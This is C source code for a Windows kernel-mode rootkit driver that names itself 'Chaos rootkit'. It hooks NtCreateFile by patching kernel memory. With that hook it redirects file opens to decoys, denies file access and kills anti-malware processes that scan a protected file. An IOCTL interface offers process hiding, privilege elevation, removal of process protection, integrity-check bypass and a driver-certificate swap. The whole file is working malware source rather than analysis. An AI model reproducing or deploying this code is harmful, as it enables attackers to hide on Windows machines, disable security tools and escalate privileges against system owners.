#include "header.h"
#include "ZwSwapCert.h"

NTSTATUS WINAPI FakeNtCreateFile2(
    PHANDLE            FileHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK   IoStatusBlock,
    PLARGE_INTEGER     AllocationSize,
    ULONG              FileAttributes,
    ULONG              ShareAccess,
    ULONG              CreateDisposition,
    ULONG              CreateOptions,
    PVOID              EaBuffer,
    ULONG              EaLength
) {
    NTSTATUS status = STATUS_UNSUCCESSFUL; 

    __try
    {

        __try {

            if (ObjectAttributes &&
                ObjectAttributes->ObjectName &&
                ObjectAttributes->ObjectName->Buffer) {

                // Check if the filename matches the hook list
                if (wcsstr(ObjectAttributes->ObjectName->Buffer, xHooklist.filename) &&\
                   !wcsstr(ObjectAttributes->ObjectName->Buffer, L".lnk")) {

                    PVOID process = NULL;

                    NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)PsGetCurrentProcessId(), &process);

                    if (ret != STATUS_SUCCESS)
                    {

                        if (ret == STATUS_INVALID_PARAMETER)
                        {
                            DbgPrint("the process ID was not found.");
                        }

                        if (ret == STATUS_INVALID_CID)
                        {
                            DbgPrint("the specified client ID is not valid.");
                        }

                        return (-1);
                    }

                    RtlCopyUnicodeString(ObjectAttributes->ObjectName, &xHooklist.decoyFile);

                    ObjectAttributes->ObjectName->Length = xHooklist.decoyFile.Length;
                    ObjectAttributes->ObjectName->MaximumLength = xHooklist.decoyFile.MaximumLength;


                    ULONG_PTR EProtectionLevel = (ULONG_PTR)process + eoffsets.protection_offset;

                    if (process)
                        ObDereferenceObject(process);

                    if (*(BYTE*)EProtectionLevel == global_protection_levels.PS_PROTECTED_ANTIMALWARE_LIGHT)
                    {
                        DbgPrint("anti-malware trying to scan it!!\n");

                        status = ZwTerminateProcess(ZwCurrentProcess(), STATUS_SUCCESS);
                        if (!NT_SUCCESS(status))
                        {
                            DbgPrint("Failed to terminate the anti-malware: %08X\n", status);
                        }
                        else
                        {
                            DbgPrint("anti-malware terminated successfully.\n");
                        }
                    }

                    return (IoCreateFile(
                        FileHandle,
                        DesiredAccess,
                        ObjectAttributes,
                        IoStatusBlock,
                        AllocationSize,
                        FileAttributes,
                        ShareAccess,
                        CreateDisposition,
                        CreateOptions,
                        EaBuffer,
                        EaLength,
                        CreateFileTypeNone,
                        (PVOID)NULL,
                        0
                    ));
                }
            }

            return ( IoCreateFile(
                FileHandle,
                DesiredAccess,
                ObjectAttributes,
                IoStatusBlock,
                AllocationSize,
                FileAttributes,
                ShareAccess,
                CreateDisposition,
                CreateOptions,
                EaBuffer,
                EaLength,
                CreateFileTypeNone,
                NULL,
                0
            ) );

        }
        __except (GetExceptionCode() == STATUS_ACCESS_VIOLATION ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)
        {
            DbgPrint("An issue occurred while hooking NtCreateFile (Hook Removed) (%08X) \n", GetExceptionCode());

            write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFileOrigin, sizeof(xHooklist.NtCreateFileOrigin));
        }
    }
    __finally
    {
        //KeReleaseMutex(&Mutex, 0);
    }

    return ( status );
}


NTSTATUS WINAPI FakeNtCreateFile3(
    PHANDLE            FileHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK   IoStatusBlock,
    PLARGE_INTEGER     AllocationSize,
    ULONG              FileAttributes,
    ULONG              ShareAccess,
    ULONG              CreateDisposition,
    ULONG              CreateOptions,
    PVOID              EaBuffer,
    ULONG              EaLength
) {
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    __try
    {

        __try {

            if (ObjectAttributes &&
                ObjectAttributes->ObjectName &&
                ObjectAttributes->ObjectName->Buffer) {

                // Check if the filename matches the hook list
                if (wcsstr(ObjectAttributes->ObjectName->Buffer, xHooklist.filename) )
                {

                    PVOID process = NULL;

                    NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)PsGetCurrentProcessId(), &process);

                    if (ret != STATUS_SUCCESS)
                    {
                        if (ret == STATUS_INVALID_PARAMETER)
                        {
                            DbgPrint("the process ID was not found.");
                        }

                        if (ret == STATUS_INVALID_CID)
                        {
                            DbgPrint("the specified client ID is not valid.");
                        }

                        return (-1);
                    }


                    ULONG_PTR EProtectionLevel = (ULONG_PTR)process + eoffsets.protection_offset;

                    if (process)
                        ObDereferenceObject(process);

                    if (*(BYTE*)EProtectionLevel == global_protection_levels.PS_PROTECTED_ANTIMALWARE_LIGHT)
                    {
                        DbgPrint("anti-malware trying to scan it!!\n");

                        status = ZwTerminateProcess(ZwCurrentProcess(), STATUS_SUCCESS);
                        if (!NT_SUCCESS(status))
                        {
                            DbgPrint("Failed to terminate the anti-malware: %08X\n", status);
                        }
                        else
                        {
                            DbgPrint("anti-malware terminated successfully.\n");
                        }
                    }

                    return (IoCreateFile(
                        FileHandle,
                        DesiredAccess,
                        ObjectAttributes,
                        IoStatusBlock,
                        AllocationSize,
                        FileAttributes,
                        ShareAccess,
                        CreateDisposition,
                        CreateOptions,
                        EaBuffer,
                        EaLength,
                        CreateFileTypeNone,
                        (PVOID)NULL,
                        0
                    ) );
                }
            }

            return (IoCreateFile(
                FileHandle,
                DesiredAccess,
                ObjectAttributes,
                IoStatusBlock,
                AllocationSize,
                FileAttributes,
                ShareAccess,
                CreateDisposition,
                CreateOptions,
                EaBuffer,
                EaLength,
                CreateFileTypeNone,
                (PVOID)NULL,
                0
            ) );
        }
        __except (GetExceptionCode() == STATUS_ACCESS_VIOLATION ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)
        {
            DbgPrint("An issue occurred while hooking NtCreateFile (Hook Removed) (%08X) \n", GetExceptionCode());

            write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFileOrigin, sizeof(xHooklist.NtCreateFileOrigin));
        }
    }
    __finally {
        //KeReleaseMutex(&Mutex, 0);
    }

    return ( status );
}

NTSTATUS WINAPI FakeNtCreateFile(
    PHANDLE            FileHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK   IoStatusBlock,
    PLARGE_INTEGER     AllocationSize,
    ULONG              FileAttributes,
    ULONG              ShareAccess,
    ULONG              CreateDisposition,
    ULONG              CreateOptions,
    PVOID              EaBuffer,
    ULONG              EaLength
) {

    int requestorPid = 0x0;

    try
    {
        __try {

            if (ObjectAttributes &&
                ObjectAttributes->ObjectName &&
                ObjectAttributes->ObjectName->Buffer)
            {

                if (wcsstr(ObjectAttributes->ObjectName->Buffer, xHooklist.filename))
                {

                    DbgPrint("Blocked : %wZ.\n", ObjectAttributes->ObjectName);

                    FLT_CALLBACK_DATA flt;

                    DbgPrint("requestor pid %d\n", requestorPid = FltGetRequestorProcessId(&flt));

                    if ((ULONG)requestorPid == (ULONG)xHooklist.pID || !requestorPid) // more testing need to be done at this part ,used 0 to avoid restricting the same process ...
                    {

                        DbgPrint("process allowed\n");

                        return ( IoCreateFile(
                            FileHandle,
                            DesiredAccess,
                            ObjectAttributes,
                            IoStatusBlock,
                            AllocationSize,
                            FileAttributes,
                            ShareAccess,
                            CreateDisposition,
                            CreateOptions,
                            EaBuffer,
                            EaLength,
                            CreateFileTypeNone,
                            (PVOID)NULL,
                            0
                        ) );
                    }

                    return ( STATUS_ACCESS_DENIED );
                }

            }

            return ( IoCreateFile(
                FileHandle,
                DesiredAccess,
                ObjectAttributes,
                IoStatusBlock,
                AllocationSize,
                FileAttributes,
                ShareAccess,
                CreateDisposition,
                CreateOptions,
                EaBuffer,
                EaLength,
                CreateFileTypeNone,
                (PVOID)NULL,
                0
            ) );
        }
        __except (GetExceptionCode() == STATUS_ACCESS_VIOLATION
            ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)
        {
            DbgPrint("an issue occured while hooking NtCreateFile (Hook Removed ) (%08) \n", GetExceptionCode());

            write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFileOrigin, sizeof(xHooklist.NtCreateFileOrigin));
        }
    }
    __finally {

        // KeReleaseMutex(&Mutex, FALSE);
    }
    return ( STATUS_SUCCESS );
}

DWORD initializehooklist(Phooklist hooklist_s, fopera rfileinfo, int Option)
{
    if (!hooklist_s || !rfileinfo.filename || (!rfileinfo.rpid && Option == 1))
    {
        DbgPrint("invalid structure provided \n");
        return (-1);
    }

    if ((uintptr_t)hooklist_s->NtCreateFileHookAddress == (uintptr_t)&FakeNtCreateFile && Option == 1 && \
        hooklist_s->pID == rfileinfo.rpid)
    {
        DbgPrint("Hook already active for function 1\n");
        return  ( STATUS_ALREADY_EXISTS );
    }

    else if ((uintptr_t)hooklist_s->NtCreateFileHookAddress == (uintptr_t)&FakeNtCreateFile2 && Option == 2)
    {
        DbgPrint("Hook already active for function 2\n");
        return  ( STATUS_ALREADY_EXISTS );
    }

    else if ((uintptr_t)hooklist_s->NtCreateFileHookAddress == (uintptr_t)&FakeNtCreateFile3 && Option == 3)
    {
        DbgPrint("Hook already active for function 3\n");
        return  ( STATUS_ALREADY_EXISTS );
    }


    if (Option == 1)
    {
        DbgPrint("allowing PID  \n", rfileinfo.rpid);

        hooklist_s->pID = rfileinfo.rpid;

        hooklist_s->NtCreateFileHookAddress = (uintptr_t)&FakeNtCreateFile;
    }

    else if (Option == 2)
        hooklist_s->NtCreateFileHookAddress = (uintptr_t)&FakeNtCreateFile2;
    else if (Option == 3 )
        hooklist_s->NtCreateFileHookAddress = (uintptr_t)&FakeNtCreateFile3;


    memcpy(hooklist_s->NtCreateFilePatch + 2, &hooklist_s->NtCreateFileHookAddress, sizeof(void*));

    RtlCopyMemory(hooklist_s->filename, rfileinfo.filename, sizeof(rfileinfo.filename));

    write_to_read_only_memory(hooklist_s->NtCreateFileAddress, &hooklist_s->NtCreateFilePatch, sizeof(hooklist_s->NtCreateFilePatch));

    DbgPrint("Hooks installed \n");

    return  ( 0 );
}

void
unloadv(
    PDRIVER_OBJECT driverObject
)
{
    __try
    {

        __try
        {
            if (xHooklist.NtCreateFileAddress)
                write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFileOrigin, sizeof(xHooklist.NtCreateFileOrigin));

            PrepareDriverForUnload();

        }
        __except ( EXCEPTION_EXECUTE_HANDLER ) {
            DbgPrint("An error occured during driver unloading \n");
        }
    }
    __finally
    {
        IoDeleteSymbolicLink(&SymbName);

        IoDeleteDevice(driverObject->DeviceObject);

        DbgPrint("Driver Unloaded\n");
    }
}

NTSTATUS processIoctlRequest(
    DEVICE_OBJECT* DeviceObject,
    IRP* Irp
)
{
    PIO_STACK_LOCATION  pstack   = IoGetCurrentIrpStackLocation(Irp);
    KPROCESSOR_MODE     prevMode = ExGetPreviousMode();

    int pstatus = 0;
    int inputInt = 0;

    __try
    {
        // if system offsets not supported / disable features 
        // that require the use of offsets to avoid crash
        if (pstack->Parameters.DeviceIoControl.IoControlCode >= HIDE_PROC && \
            pstack->Parameters.DeviceIoControl.IoControlCode <= UNPROTECT_ALL_PROCESSES && xHooklist.check_off)
        {
            pstatus = ERROR_UNSUPPORTED_OFFSET;
            __leave;
        }
        // https://x.com/ZeroMemoryEx/status/1990477074457387066 to add this later
        /*
        if (prevMode == UserMode && Irp->AssociatedIrp.SystemBuffer)
        {
            __try
            {
                ProbeForRead(
                    Irp->AssociatedIrp.SystemBuffer,
                    pstack->Parameters.DeviceIoControl.InputBufferLength,
                    1
                );
            }
            __except (EXCEPTION_EXECUTE_HANDLER)
            {
                pstatus = GetExceptionCode();
                DbgPrint("ProbeForRead failed :((((((  : 0x%08X\n", pstatus);
                __leave;
            }
        }
        */
        switch (pstack->Parameters.DeviceIoControl.IoControlCode)
        {
            case HIDE_PROC:
            {
                if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(int))
                {
                    pstatus = STATUS_BUFFER_TOO_SMALL;
                    break;
                }
                RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));
            
                pstatus = HideProcess(inputInt);
            
                DbgPrint("Received input value: %d\n", inputInt);
                break;
            }
            
            case PRIVILEGE_ELEVATION:
            {
                if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(int))
                {
                    pstatus = STATUS_BUFFER_TOO_SMALL;
                    break;
                }
            
                RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));
            
                pstatus = PrivilegeElevationForProcess(inputInt);
            
                DbgPrint("Received input value: %d\n", inputInt);
            
                break;
            }

            case CR_SET_PROTECTION_LEVEL_CTL:
            {
                if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(CR_SET_PROTECTION_LEVEL))
                {
                    pstatus = STATUS_BUFFER_TOO_SMALL;
                    break;
                }
            
                PCR_SET_PROTECTION_LEVEL Args = Irp->AssociatedIrp.SystemBuffer;
            
                pstatus = ChangeProtectionLevel(Args);
            
                break;
            }

            case RESTRICT_ACCESS_TO_FILE_CTL:
            {
                if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(fopera))
                {
                    pstatus = STATUS_BUFFER_TOO_SMALL;
                    break;
                }
                fopera rfileinfo = { 0 };
                RtlCopyMemory(&rfileinfo, Irp->AssociatedIrp.SystemBuffer, sizeof(rfileinfo));
            
                pstatus = initializehooklist(&xHooklist, rfileinfo, 1);
                DbgPrint("File access restricted ");
                break;
            }

            case PROTECT_FILE_AGAINST_ANTI_MALWARE_CTL:
            {
                if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(fopera))
                {
                    pstatus = STATUS_BUFFER_TOO_SMALL;
                    break;
                }
                fopera rfileinfo = { 0 };
                RtlCopyMemory(&rfileinfo, Irp->AssociatedIrp.SystemBuffer, sizeof(rfileinfo));
            
                pstatus = initializehooklist(&xHooklist, rfileinfo, 3);
                DbgPrint(" file protected against anti-malware processes ");
                break;
            }

            case BYPASS_INTEGRITY_FILE_CTL: // 
            {
                if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(fopera))
                {
                    pstatus = STATUS_BUFFER_TOO_SMALL;
                    break;
                }
                fopera rfileinfo = { 0 };
                RtlCopyMemory(&rfileinfo, Irp->AssociatedIrp.SystemBuffer, sizeof(rfileinfo));
                pstatus = initializehooklist(&xHooklist, rfileinfo, 2);
            
                DbgPrint("bypass integrity check ");
                break;
            }
            
            case UNPROTECT_ALL_PROCESSES:
            {
                pstatus = UnprotectAllProcesses();
            
                DbgPrint("all Processes Protection has been removed");
                break;
            }

            case ZWSWAPCERT_CTL:
            {
                if (NT_SUCCESS(pstatus = ScDriverEntry(DeviceObject->DriverObject, registryPathCopy)) )
                {
                    DbgPrint("{ZwSwapCert} Driver swapped in memory and on disk.\n");
            
                }
                else
                {
                    DbgPrint("{ZwSwapCert} Failed to swap driver \n");
            
                }
                break;
            }

            default:
            {
                DbgPrint("Invalid IOCTL code: 0x%08X\n", pstack->Parameters.DeviceIoControl.IoControlCode);
                pstatus = STATUS_INVALID_DEVICE_REQUEST;
                break;
            }
        }
    }
    __except (GetExceptionCode() == STATUS_ACCESS_VIOLATION
        ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) 
    {

        if (GetExceptionCode() == STATUS_ACCESS_VIOLATION)
        {
            DbgPrint("Invalid Buffer (STATUS_ACCESS_VIOLATION)");

            KPROCESSOR_MODE prevmode = ExGetPreviousMode();

            if (prevmode == UserMode)
            {
                DbgPrint("possible that the client is attempting to crash the driver, but not if we crash you first :) ");

                if (!NT_SUCCESS(pstatus))
                {
                    DbgPrint("failed to open process (%08X)\n", pstatus);
                
                }
                else
                {
                    pstatus  = ZwTerminateProcess(ZwCurrentProcess(), STATUS_SUCCESS);
                    
                    if (!NT_SUCCESS(pstatus))
                    {
                        DbgPrint("failed to terminate the requestor process (%08X)\n", pstatus);
                    }
                }

            }
        }

        pstatus = GetExceptionCode();
    }

    memcpy(Irp->AssociatedIrp.SystemBuffer, &pstatus, sizeof(pstatus));

    Irp->IoStatus.Status = pstatus;

    Irp->IoStatus.Information = sizeof(int);

    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    if (pstatus)
        return (STATUS_UNSUCCESSFUL);

    return (STATUS_SUCCESS);

}



void
ShutdownCallback(
    PDRIVER_OBJECT driverObject
)
{
    __try
    {

        __try
        {
            DbgPrint("preparing driver to be unloaded ..\n");

            PrepareDriverForUnload();

        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            DbgPrint("An error occured during driver unloading on shutdown \n");
        }
    }
    __finally
    {

        DbgPrint("Driver Unloaded in shutdown\n");
    }
}

NTSTATUS
DriverEntry(
    PDRIVER_OBJECT driverObject,
    PUNICODE_STRING registryPath
)
{
    DbgPrint("Chaos rootkit loaded .. (+_+) \n");

    NTSTATUS status;

    UNREFERENCED_PARAMETER(driverObject);

    if (!NT_SUCCESS(status = InitializeStructure(&xHooklist)))
    {
        DbgPrint(("Failed to initialize hook structure (0x%08X)\n", status));
        return (STATUS_UNSUCCESSFUL);
    }

    registryPathCopy = registryPath;
    
    status = IoCreateDevice(driverObject, 0, &DeviceName, FILE_DEVICE_UNKNOWN, METHOD_BUFFERED, FALSE, &driverObject->DeviceObject);

    if (!NT_SUCCESS(status))
    {
        DbgPrint(("Failed to create device object (0x%08X)\n", status));
        return (STATUS_UNSUCCESSFUL);
    }

    status = IoCreateSymbolicLink(&SymbName, &DeviceName);

    if (!NT_SUCCESS(status))
    {
        DbgPrint(("Failed to create symbolic link (0x%08X)\n", status));
        IoDeleteDevice(driverObject->DeviceObject);
        return (STATUS_UNSUCCESSFUL);
    }

    if (InitializeOffsets(&xHooklist))
    {
        DbgPrint("Unsupported Windows build !\n");
        //unloadv(driverObject);
        //return (STATUS_UNSUCCESSFUL);
    }
    else
    {
        DbgPrint("Offsets initialized\n");
    }
    
    if (!NT_SUCCESS(status = IoRegisterShutdownNotification(driverObject->DeviceObject)))
    {
        DbgPrint("Failed to register the shutdown notification callback (0x%08) \n",status);
        unloadv(driverObject);
        return (STATUS_UNSUCCESSFUL);
    }


    driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL]  = processIoctlRequest;
    driverObject->MajorFunction[IRP_MJ_SHUTDOWN]        = ShutdownCallback;
    driverObject->MajorFunction[IRP_MJ_CREATE]          = IRP_MJCreate;
    driverObject->MajorFunction[IRP_MJ_CLOSE]           = IRP_MJClose;
    driverObject->DriverUnload                          = &unloadv;

    return (STATUS_SUCCESS);
}



